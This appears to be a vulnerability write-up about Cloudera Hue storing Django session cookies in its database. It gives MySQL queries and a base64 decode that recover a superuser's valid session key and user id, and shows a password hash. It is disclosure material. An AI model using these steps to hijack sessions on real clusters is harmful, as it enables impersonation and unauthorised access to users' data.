Session cookies stored in the database
======================================

Description
-----------
**User session cookies are stored** in the database. Combined with the vulnerability related to [configuration file which is world readable](../Configuration file world readable/), it is possible to **spoof a user across the entire cluster launching jobs and browsing the datalake**, without having to crack password hashes.

Cookies are stored in the `django_session` table: `session_key` is the **cookie** and `session_data` holds the **user id with some other information encoded in base64.**
The following example shows how to **find a valid session cookie for a specific user (id=1).**
```
mysql> select * from django_session limit 1 \G ;
*************************** 1. row ***************************
 session_key: m67424cld61xe8960moyjj1esjqfiyvj
session_data: NGY2MzJhYjkxM2M5ZTU4ZDk0YjNjNjc4ODI1NmVkMzExMTI3YTc5NDp7Il9hdXRoX3VzZXJfYmFja2VuZCI6ImRlc2t0b3AuYXV0aC5iYWNrZW5kLkFsbG93Rmlyc3RVc2VyRGphbmdvQmFja2VuZCIsIl9hdXRoX3VzZXJfaWQiOjF9
 expire_date: 2017-01-03 07:00:07
```
```
$ echo NGY2MzJhYjkxM2M5ZTU4ZDk0YjNjNjc4ODI1NmVkMzExMTI3YTc5NDp7Il9hdXRoX3VzZXJfYmFja2VuZCI6ImRlc2t0b3AuYXV0aC5iYWNrZW5kLkFsbG93Rmlyc3RVc2VyRGphbmdvQmFja2VuZCIsIl9hdXRoX3VzZXJfaWQiOjF9 | base64 -d
4f632ab913c9e58d94b3c6788256ed311127a794:{"_auth_user_backend":"desktop.auth.backend.AllowFirstUserDjangoBackend","_auth_user_id":1}
```
```
mysql> select * from auth_user where id = 1 \G ;
*************************** 1. row ***************************
          id: 1
    password: pbkdf2_sha256$12000$dtbAVcdT4Ph9$4QMdEvX5Z0b5NFcPb69L50/cRo2ARFg/WCtk3/dcPw0=
  last_login: 2016-12-20 07:00:07
is_superuser: 1
    username: cloudera
  first_name: 
   last_name: 
       email: noreply@cloudera.com
    is_staff: 1
   is_active: 1
 date_joined: 2015-11-18 13:08:31
```
  
  
References
----------
  * [Issue on the HUE repository](https://github.com/cloudera/hue/issues/465)